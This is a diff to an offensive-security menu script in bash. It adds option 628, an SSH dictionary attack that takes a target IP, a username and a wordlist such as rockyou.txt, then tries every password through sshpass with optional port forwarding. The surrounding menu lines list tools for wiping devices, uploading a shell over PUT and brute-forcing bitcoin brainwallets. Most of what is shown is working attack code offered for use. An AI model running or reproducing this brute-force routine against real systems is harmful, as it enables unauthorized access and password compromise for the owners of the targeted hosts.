@@ -516,7 +516,7 @@ while true; do
 	echo -ne " 429. wipe an external device\t\t\t430. wipe a file\t\t\t\t\t431. shred a file\n"
 	echo -ne " 561. get a remote file in base64 encode\t596. download all files inside a folder shared via smb or samba\n"
 	echo -ne " 598. get some useful files from remote url or ip\t\t\t\t\t\t\t600. upload a shell with PUT method\n"
-	echo -ne " 618. enum users with finger\n"
+	echo -ne " 618. enum users with finger\t\t\t628. ssh dictionary remote attack with optional port forwarding\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -3344,6 +3344,41 @@ while true; do
 	;;
 	"627")
 		Clona "w-digital-scanner/w13scan"
+	;;
+	"628")
+		echo "Digit target IP or URL"
+		read -p "(example  192.168.168.12): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			echo "Digit target username"
+			read -p "(example, john): " USR
+			if [[ "$USR" != "" ]];
+			then
+				echo "Digit target domain"
+				read -p "(example, john-pc): " DMN
+				if [[ "$DMN" != "" ]];
+				then
+					echo "Digit a wordlist password file path"
+					read -p "(example, /usr/share/wordlist/rockyou.txt): " WFL
+					if [[ -f "$WFL" ]];
+					then
+						echo "Digit a LOCAL PORT for port forwarding (optional)"
+						read -p "(example, 8080) default 22: " LPRT
+						if [[ "$LPRT" == "" ]];
+						then
+							LPRT="22"
+						fi
+						echo "Digit a REMOTE PORT for port forwarding (optional)"
+						read -p "(example, 80) default 22: " RPRT
+						if [[ "$RPRT" == "" ]];
+						then
+							RPRT="22"
+						fi
+						for PASS in $(cat "$WFL"); do sshpass -p "$PASS" ssh -L "$LPRT"":""$TIP"":""$RPRT" "$USR""@""$DMN"; done
+					fi
+				fi
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
